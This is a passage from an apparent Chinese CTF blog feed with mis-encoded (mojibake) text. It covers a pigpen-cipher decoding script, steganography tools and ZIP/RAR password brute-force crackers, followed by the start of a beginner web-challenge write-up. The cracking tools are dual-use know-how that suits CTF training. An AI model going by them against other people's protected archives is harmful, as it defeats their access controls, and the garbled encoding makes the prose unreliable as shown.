å¯†æ–¹å¼æ˜¯ä»¥æ¯ä¸ªæ˜æ–‡å­—æ¯è¢«ä¸ä¹‹å”¯ä¸€å¯¹åº”ä¸”ä¸åŒçš„å­—æ¯æ›¿æ¢çš„æ–¹å¼å®ç°çš„ï¼Œå®ƒä¸åŒäºæºæ’’å¯†ç ï¼Œå› ä¸ºå¯†ç å­—æ¯è¡¨çš„å­—æ¯ä¸æ˜¯ç®€å•çš„ç§»ä½ï¼Œè€Œæ˜¯å®Œå…¨æ˜¯æ··ä¹±çš„ ä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ˜æ–‡å­—æ¯ : abcdefghijklmnopqrstuvwxyz</span><br><span class="line">æ˜æ–‡å­—æ¯ : phqgiumeaylnofdxjkrcvstzwb</span><br></pre></td></tr></table></figure><p>å…¶å®æˆ‘æ„Ÿè§‰æœ‰ç‚¹åƒæ˜¯è¯é¢‘æ”»å‡»å°±å¯ä»¥è§£å†³æ‰€ä»¥æˆ‘ï¼ˆéº¦é¦™å¸ˆå‚…å‘Šè¯‰æˆ‘æ‰çŸ¥é“çš„ï¼‰æ¨èä¸€ä¸ªè¯é¢‘æ”»å‡»çš„ç½‘ç«™<code>è¦æœ‰æ¢¯å­</code><a href="http://quipqiup.com/index.php">http://quipqiup.com/index.php</a></p><h2 id="çŒªåœˆå¯†ç "><a href="#çŒªåœˆå¯†ç " class="headerlink" title="çŒªåœˆå¯†ç "></a>çŒªåœˆå¯†ç </h2><p>çŒªåœˆå¯†ç (Pigpen Cipheræˆ–ç§°ä¹å®«æ ¼å¯†ç ã€æœ±é«˜å¯†ç ã€å…±æµä¼šå¯†ç æˆ–å…±æµä¼šå‘˜å¯†ç )ï¼Œæ˜¯ä¸€ç§ä»¥æ ¼å­ä¸ºåŸºç¡€çš„ç®€å•æ›¿ä»£å¼å¯†ç <br>æ˜æ–‡å’Œå¯†æ–‡å¯¹åº”ï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pigpen-cipher.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pigpen-cipher.jpg"></a></p><p>åœ¨çº¿è§£å¯†<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html">é£æœºç¥¨</a><br>ä¸Šé¢æ˜¯æ­£å¸¸çš„å¯¹åº” æˆ‘è§è¿‡ä¸€ç§å˜å½¢çš„ ä¸å…¶è¯´æ˜¯çŒªåœˆä¸å¦‚è¯´æ˜¯æ›¿æ¢<br>æ›¿æ¢è§„åˆ™æ˜¯ å·¦å³å­—æ¯æ›¿æ¢</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pigpen-cipher-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pigpen-cipher-02.jpg"></a></p><p>å³è¾¹çš„è·Ÿå·¦è¾¹çš„ä¸€ä¸€å¯¹åº”ï¼Œåœ¨å·¦è¾¹çš„æ¢æˆå³è¾¹<br><code>2015å¹´å¹¿ä¸œå¼ºç½‘æ¯ å°å¿ƒçŒªåœˆ</code>çš„é¢˜ç›®å°±æ˜¯è¿™æ ·çš„<br>é™„ä¸Šæˆ‘çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">s=raw_input()</span><br><span class="line">Key = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>:<span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>:<span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>:<span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>:<span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>:<span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>:<span class="string">&#x27;q&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>:<span class="string">&#x27;r&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>:<span class="string">&#x27;w&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>:<span class="string">&#x27;x&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>:<span class="string">&#x27;z&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-&#x27;</span>:<span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&#123;&#x27;</span>:<span class="string">&#x27;&#123;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&#125;&#x27;</span>:<span class="string">&#x27;&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>:<span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>:<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>:<span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>:<span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>:<span class="string">&#x27;g&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>:<span class="string">&#x27;h&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>:<span class="string">&#x27;i&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>:<span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>:<span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>:<span class="string">&#x27;v&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">output1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">0</span>,len(s)):</span><br><span class="line">     temp=s[i]</span><br><span class="line">     output1+=Key[temp]</span><br><span class="line"><span class="keyword">print</span> output1</span><br></pre></td></tr></table></figure><p>æ›´å¤šå…³äºå¯†ç å­¦å’Œç¼–ç çš„é—®é¢˜å¯ä»¥å‚è€ƒ<a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html">4ido10nè¡¨å“¥çš„åšæ–‡</a></p><h1 id="éšå†™å·¥å…·"><a href="#éšå†™å·¥å…·" class="headerlink" title="éšå†™å·¥å…·"></a>éšå†™å·¥å…·</h1><h2 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h2><p>å›¾ç‰‡éšå†™çš„ç¥å™¨ <a href="https://yunpan.cn/c6jV9E9ZevwdF">ä¸‹è½½çš„ä¼ é€é—¨</a>ï¼ˆæå–ç ï¼šc146ï¼‰</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/stegosolve-01" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/stegosolve-01"></a></p><p>å…·ä½“å¯ä»¥è‡ªå·±å°è¯• ç®€å•ä»‹ç»å‡ ä¸‹ä¸¤ä¸ªåŠŸèƒ½</p><ol><li>Stereogram Solver<br>è¿™ä¸ªåŠŸèƒ½å¯ä»¥ä»ä¸åŒé€šé“å»åˆ†æå›¾ç‰‡</li><li>Frame Browser<br> è¿™ä¸ªåŠŸèƒ½æ˜¯å¦‚æœè¿™å¼ å›¾ç‰‡é‡Œé¢è¿˜è—è¿™å¦å¤–ä¸€å¼ å›¾ç‰‡çš„è¯ ä»–å¯ä»¥åˆ†ç¦»å‡ºæ¥</li><li>Image Combiner<br>è¿™ä¸ªåŠŸèƒ½å¯ä»¥å¯¹æ¯”ä¸¤å¼ å›¾ç‰‡ æœ€ç»ˆSubå‡ºä¸ä¸€æ ·çš„åœ°æ–¹<h2 id="pngcheck"><a href="#pngcheck" class="headerlink" title="pngcheck"></a>pngcheck</h2><code>pngcheck.exe -v sctf.png</code><br><code>è¿™ä¸ªæ˜¯Dosä¸‹çš„å·¥å…· win32å¹³å°çš„</code><br><a href="https://yunpan.cn/c6jjU9MsIWkWv">ä¸‹è½½ä¼ é€é—¨</a> ï¼ˆæå–ç ï¼šf47bï¼‰<br>ä»–çš„åŠŸèƒ½æ˜¯æ£€æµ‹pngæ ¼å¼å›¾ç‰‡çš„æŸåä½ç½® ä¸€èˆ¬ç”¨æ¥å¯¹PNGéšå†™è¿›è¡Œä¿®å¤ä¼šç”¨åˆ°<h2 id="stegdetect"><a href="#stegdetect" class="headerlink" title="stegdetect"></a>stegdetect</h2>è¿™ä¸ªä¸œè¥¿æ˜¯ç”¨æ¥æ£€æµ‹å›¾ç‰‡çš„éšå†™æ–¹å¼çš„ å®ƒå¯ä»¥æ£€æµ‹åˆ°é€šè¿‡JStegã€JPHideã€OutGuessã€Invisible Secretsã€F5ã€appendXå’ŒCamouflageç­‰è¿™äº›éšå†™å·¥å…·éšè—çš„ä¿¡æ¯<br><a href="https://yunpan.cn/c6jwUT7EA9ywW">ä¸‹è½½ä¼ é€é—¨</a> ï¼ˆæå–ç ï¼š4c2eï¼‰</li></ol><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pngcheck-01" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pngcheck-01"></a></p><p>æ¯”å¦‚å›¾ä¸­å°±å¯ä»¥çœ‹å‡ºä»–æ˜¯<code>Jphide</code>éšå†™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨è§„åˆ™:</span><br><span class="line">    q ä»…æ˜¾ç¤ºå¯èƒ½åŒ…å«éšè—å†…å®¹çš„å›¾åƒã€‚</span><br><span class="line">-n å¯ç”¨æ£€æŸ¥JPEGæ–‡ä»¶å¤´åŠŸèƒ½ï¼Œä»¥é™ä½è¯¯æŠ¥ç‡ã€‚å¦‚æœå¯ç”¨ï¼Œæ‰€æœ‰å¸¦æœ‰æ‰¹æ³¨åŒºåŸŸçš„æ–‡ä»¶å°†è¢«è§†ä¸ºæ²¡æœ‰è¢«åµŒå…¥ä¿¡æ¯ã€‚å¦‚æœJPEGæ–‡ä»¶çš„JFIFæ ‡è¯†ç¬¦ä¸­çš„ç‰ˆæœ¬å·ä¸æ˜¯1.1ï¼Œåˆ™ç¦ç”¨OutGuessæ£€æµ‹ã€‚</span><br><span class="line">-s ä¿®æ”¹æ£€æµ‹ç®—æ³•çš„æ•æ„Ÿåº¦ï¼Œè¯¥å€¼çš„é»˜è®¤å€¼ä¸º1ã€‚æ£€æµ‹ç»“æœçš„åŒ¹é…åº¦ä¸æ£€æµ‹ç®—æ³•çš„æ•æ„Ÿåº¦æˆæ­£æ¯”ï¼Œç®—æ³•æ•æ„Ÿåº¦çš„å€¼è¶Šå¤§ï¼Œæ£€æµ‹å‡ºçš„å¯ç–‘æ–‡ä»¶åŒ…å«æ•æ„Ÿä¿¡æ¯çš„å¯èƒ½æ€§è¶Šå¤§ã€‚</span><br><span class="line">-d æ‰“å°å¸¦è¡Œå·çš„è°ƒè¯•ä¿¡æ¯ã€‚</span><br><span class="line">-t è®¾ç½®è¦æ£€æµ‹å“ªäº›éšå†™å·¥å…·ï¼ˆé»˜è®¤æ£€æµ‹jopiï¼‰ï¼Œå¯è®¾ç½®çš„é€‰é¡¹å¦‚ä¸‹ï¼š</span><br><span class="line">j æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨jstegåµŒå…¥çš„ã€‚</span><br><span class="line">o æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨outguessåµŒå…¥çš„ã€‚</span><br><span class="line">p æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨jphideåµŒå…¥çš„ã€‚</span><br><span class="line">i æ£€æµ‹å›¾åƒä¸­çš„ä¿¡æ¯æ˜¯å¦æ˜¯ç”¨invisible secretsåµŒå…¥çš„ã€‚</span><br><span class="line">-V æ˜¾ç¤ºè½¯ä»¶ç‰ˆæœ¬å·ã€‚</span><br><span class="line">å¦‚æœæ£€æµ‹ç»“æœæ˜¾ç¤ºè¯¥æ–‡ä»¶å¯èƒ½åŒ…å«éšè—ä¿¡æ¯ï¼Œé‚£ä¹ˆStegdetectä¼šåœ¨æ£€æµ‹ç»“æœåé¢ä½¿ç”¨1ï½3é¢—æ˜Ÿæ¥æ ‡è¯†</span><br><span class="line">éšè—ä¿¡æ¯å­˜åœ¨çš„å¯èƒ½æ€§å¤§å°ï¼Œ3é¢—æ˜Ÿè¡¨ç¤ºéšè—ä¿¡æ¯å­˜åœ¨çš„å¯èƒ½æ€§æœ€å¤§ã€‚</span><br></pre></td></tr></table></figure><h2 id="Jphide"><a href="#Jphide" class="headerlink" title="Jphide"></a>Jphide</h2><p>å…ˆæ¨èè¡¨å“¥çš„åšæ–‡ ä»–å†™å¾—å¥½è¯¦ç»†<a href="https://www.hackfun.org/CTF/jphide-steganography.html">ä¼ é€é—¨</a><br><a href="http://linux01.gwdg.de/~alatham/stego.html">ä¸‹è½½ä¼ é€é—¨</a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/jphide-01" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/jphide-01"></a></p><p><code>å·¦è¾¹æ˜¯éšå†™ å³è¾¹æ˜¯æå–éšå†™æ–‡ä»¶</code></p><h2 id="Winhex"><a href="#Winhex" class="headerlink" title="Winhex"></a>Winhex</h2><p>äºŒè¿›åˆ¶æ–‡ä»¶æ‰“å¼€æ–¹å¼</p><h2 id="wbs43open"><a href="#wbs43open" class="headerlink" title="wbs43open"></a>wbs43open</h2><p><code>PDF</code>æ–‡ä»¶éšå†™çš„ä¸äºŒé€‰æ‹© <a href="https://yunpan.cn/c6jcYbgFjajmp">ä¸‹è½½ä¼ é€é—¨</a> ï¼ˆæå–ç ï¼š2336ï¼‰</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/wbs43open.jjpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/wbs43open.jjpg"></a></p><h2 id="Iamge-Stganograpy"><a href="#Iamge-Stganograpy" class="headerlink" title="Iamge Stganograpy"></a>Iamge Stganograpy</h2><p>è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå›¾ç‰‡çš„éšå†™å·¥å…·<br>å½“åˆæ­»æ´»åœ¨è°·æ­Œ ç™¾åº¦ç­‰åœ°æ–¹éƒ½æ‰¾ä¸åˆ° æœ€å<code>ç™½å¸ˆå‚…</code>åœ¨æœç‹—æ‰¾åˆ°äº†â€¦<br><a href="http://imagesteganography.codeplex.com/">ä¸‹è½½ä¼ é€é—¨</a></p><h2 id="F5ç®—æ³•éšå†™å®ç°"><a href="#F5ç®—æ³•éšå†™å®ç°" class="headerlink" title="F5ç®—æ³•éšå†™å®ç°"></a>F5ç®—æ³•éšå†™å®ç°</h2><p><a href="https://yunpan.cn/c6jdvEtep8guk">ä¸‹è½½ä¼ é€é—¨</a> ï¼ˆæå–ç ï¼šc033)</p><h2 id="silenteye-éŸ³é¢‘éšå†™ï¼‰"><a href="#silenteye-éŸ³é¢‘éšå†™ï¼‰" class="headerlink" title="silenteye(éŸ³é¢‘éšå†™ï¼‰"></a>silenteye(éŸ³é¢‘éšå†™ï¼‰</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/silenteye.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/silenteye.jpg"></a></p><h2 id="MP3Stego"><a href="#MP3Stego" class="headerlink" title="MP3Stego"></a>MP3Stego</h2><p>é¡¾åæ€ä¹‰ è¿™æ˜¯ä¸€ä¸ªæ¬¾éŸ³é¢‘éšå†™å·¥å…·<a href="http://www.petitcolas.net/steganography/mp3stego/">ä¸‹è½½ä¼ é€é—¨</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç”¨MP3Stegoè¿›è¡ŒåŠ å¯†è§£å¯†ï¼š</span><br><span class="line"></span><br><span class="line">åŠ å¯†ï¼šencode -E åŠ å¯†æ–‡æœ¬ -P å¯†ç   mp3æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">è§£å¯†ï¼šdecode -X -P  å¯†ç   mp3æ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="Outguess"><a href="#Outguess" class="headerlink" title="Outguess"></a>Outguess</h2><p>2016-08-04 21:07:46<br>ä»Šå¤©é‡åˆ°çš„ä¸€ä¸ªéšå†™å·¥å…· CSDNæœ‰æºç </p><figure class="highlight plain"><figcaption><span>code</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;configure &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•<code> outguess</code>å°±èƒ½çœ‹åˆ°ä½¿ç”¨æ–¹æ³•å•¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outguess -r bystudent.jpg outfile.txt</span><br></pre></td></tr></table></figure><p><strong>è¿™ä¸ªéšå†™æ–¹å¼ä¹Ÿæ˜¯å¯ä»¥é€šè¿‡stegdetect</strong>æ£€æµ‹å‡ºæ¥çš„</p><h3 id="outguess-winç‰ˆæœ¬"><a href="#outguess-winç‰ˆæœ¬" class="headerlink" title="outguess winç‰ˆæœ¬"></a>outguess winç‰ˆæœ¬</h3><p><a href="https://yunpan.cn/cvGgexSzz2byb">ä¸‹è½½</a> ï¼ˆæå–ç ï¼še2b8ï¼‰</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/outguess" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/outguess"></a></p><h2 id="BCompare"><a href="#BCompare" class="headerlink" title="BCompare"></a>BCompare</h2><p>ç»™ä¸ªä¾‹å­ ä¸€ä¸ªMisc <a href="http://www.bodkin.ren/?p=553">é¢˜ç›®è¯¦æƒ…</a><br>ä½†æ˜¯è¿™é‡Œä»‹ç»çš„æ˜¯BCompareçš„è§£ä¸€ä¸ªéšå†™é¢˜çš„æ–¹æ³•<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pokenmon-box.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pokenmon-box.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pokenmon.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/pokenmon.jpg"></a></p><p>è¿™é‡Œä¸¤å¼ å›¾ æ˜æ˜¾å°±æ˜¯è¦æŠŠä¸¤å¼ å›¾æ”¾åœ¨ä¸€èµ·  çœ‹å®¹å·®çš„</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/comapare" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/comapare"></a></p><h2 id="Brain-Too"><a href="#Brain-Too" class="headerlink" title="Brain Too"></a>Brain Too</h2><p>è¿™ä¹Ÿæ˜¯ä¸€ä¸ªéšå†™å·¥å…· <code>ä¸»è¦ç”¨äºbrainfuckçš„éšå†™æ–¹å¼</code><br><a href="https://yunpan.cn/cvGgTwB94bk5a">ä¸‹è½½</a> ï¼ˆæå–ç ï¼šb35a)</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/brain_too.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/brain_too.jpg"></a></p><h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><h2 id="Yafu"><a href="#Yafu" class="headerlink" title="Yafu"></a>Yafu</h2><p>å¤§æ•´æ•°åˆ†è§£ <a href="https://yunpan.cn/c6jHKGCbiwEPJ">ä¸‹è½½ä¼ é€é—¨</a>ï¼ˆæå–ç ï¼š16f4ï¼‰</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/yafu" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/yafu"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">factor(è¦åˆ†è§£çš„æ•´æ•°)</span><br></pre></td></tr></table></figure><h2 id="Ziperello"><a href="#Ziperello" class="headerlink" title="Ziperello"></a>Ziperello</h2><p><code>ZIP</code>å‹ç¼©åŒ…æš´åŠ›ç ´è§£ <a href="https://yunpan.cn/c6jFbIaYXFQxw">ä¸‹è½½ä¼ é€é—¨</a>ï¼ˆæå–ç ï¼š324a)</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ziperello" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ziperello"></a></p><h2 id="ARPR-ha"><a href="#ARPR-ha" class="headerlink" title="ARPR-ha"></a>ARPR-ha</h2><p><code>RAR</code>æš´åŠ›ç ´è§£ <a href="https://yunpan.cn/c6jFCzLhVDGbX">ä¸‹è½½ä¼ é€é—¨</a> ï¼ˆæå–ç ï¼š6092ï¼‰</p><h2 id="AAPasswordRecovery"><a href="#AAPasswordRecovery" class="headerlink" title="AAPasswordRecovery"></a>AAPasswordRecovery</h2><p>ZIP /RARç­‰å‹ç¼©è½¯ä»¶çš„ç ´è§£å·¥å…· <a href="https://yunpan.cn/c6jL27k6Nvfvc"></a> ï¼ˆæå–ç ï¼šf6c7)<br>å¯æ”¯æŒå¤šç§ç ´è§£æ–¹å¼<br>åŒ…æ‹¬</p><ol><li><p>æ˜æ–‡æ”»å‡»</p></li><li><p>æš´åŠ›ç ´è§£</p></li><li><p>å­—å…¸æ”»å‡»</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/aapasswordrevovery" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/aapasswordrevovery"></a></p></li></ol><h2 id="PKCrack"><a href="#PKCrack" class="headerlink" title="PKCrack"></a>PKCrack</h2><p><code>ZIP</code>æ˜æ–‡ç ´è§£å·¥å…· <a href="http://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html">ä¸‹è½½ä¼ é€é—¨</a><br><a href="http://blog.csdn.net/jiangwlee/article/details/6911087">è¯¦ç»†ä½¿ç”¨æ–¹æ³•è¯·çœ‹è¿™</a></p><h1 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h1><p><code>CTFå¸¸ç”¨å·¥å…·é›†åˆ</code><a href="http://www.codefrom.com/c/43">çœ‹è¿™é‡Œ</a><br><code>è¡¨å“¥çš„ç¼–ç è§£ç åšæ–‡</code><a href="https://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html">æ¥è¿™é‡Œ</a><br><code>CTFéšå†™æ€»ç»“</code><a href="http://bobao.360.cn/learning/detail/243.html">åœ¨è¿™é‡Œ</a></p><h1 id="æ›´æ–°æ—¥å¿—"><a href="#æ›´æ–°æ—¥å¿—" class="headerlink" title="æ›´æ–°æ—¥å¿—"></a>æ›´æ–°æ—¥å¿—</h1><p>å¾…ç»­æ›´æ–° 2016-07-27 17:58:07</p><hr><p>2016-10-20 13:43:47<br>æ›´æ–°å†…å®¹<br>â€‹     <code>BCompare</code><br>â€‹     <code>Brain Tool</code><br>â€‹     <code>Outguess</code> winç‰ˆæœ¬</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> Tools </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹30å¼ºéƒ¨åˆ†write-up</title>
      <link href="ichunqiu-30-strong-part-of-the-customs-guide.html"/>
      <url>ichunqiu-30-strong-part-of-the-customs-guide.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="åŸºç¡€é¢˜"><a href="#åŸºç¡€é¢˜" class="headerlink" title="åŸºç¡€é¢˜"></a>åŸºç¡€é¢˜</h1><h2 id="èƒ½çœ‹åˆ°å—ï¼Ÿ"><a href="#èƒ½çœ‹åˆ°å—ï¼Ÿ" class="headerlink" title="èƒ½çœ‹åˆ°å—ï¼Ÿ"></a>èƒ½çœ‹åˆ°å—ï¼Ÿ</h2><p>F12å®¡æŸ¥å…ƒç´ æŸ¥çœ‹</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichuqiu-30-1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichuqiu-30-1.png"></a></p><p>æœ‰ä¸ªäº‹ä»¶ ç‚¹å‡»äº‹ä»¶æ‰€åœ¨çš„å›¾ç‰‡ å°±èƒ½å¼¹å‡ºflagäº†ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/inchuqiu-2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/inchuqiu-2.png"></a></p><h2 id="åŠ å¯†åœ°å€"><a href="#åŠ å¯†åœ°å€" class="headerlink" title="åŠ å¯†åœ°å€"></a>åŠ å¯†åœ°å€</h2><p>F12åŒç†ä½¿ç”¨å®¡æŸ¥å…ƒç´   è¿™ä¸ªå¥½ç®€å•</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-3.png"></a></p><h2 id="çœ‹ä»”ç»†äº†"><a href="#çœ‹ä»”ç»†äº†" class="headerlink" title="çœ‹ä»”ç»†äº†"></a>çœ‹ä»”ç»†äº†</h2><p>æŸ¥çœ‹æºä»£ç   å‘ç°æ˜¯base64ç¼–ç çš„å¯†æ–‡ è§£å¯†åå¡«å…¥å°±å¥½äº†</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-4.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-4.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-5.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/ichunqiu-5.png"></a></p><h2 id="å¤–è¡¨å…·æœ‰è¿·æƒ‘æ€§"><a href="#å¤–è¡¨å…·æœ‰è¿·æƒ‘æ€§" class="headerlink" title="å¤–è¡¨å…·æœ‰è¿·æƒ‘æ€§"></a>å¤–è¡¨å…·æœ‰è¿·æƒ‘æ€§</h2><p>æŸ¥çœ‹æºä»£ç  å‘ç°æœ‰unicodeåŠ å¯†çš„å¯†æ–‡ è§£å¯†å³å¯<br><a href="http://tool.chinaz.com/Tools/Unicode.aspx?jdfwkey=kbpld">è§£å¯†åœ°å€</a></p><p><a 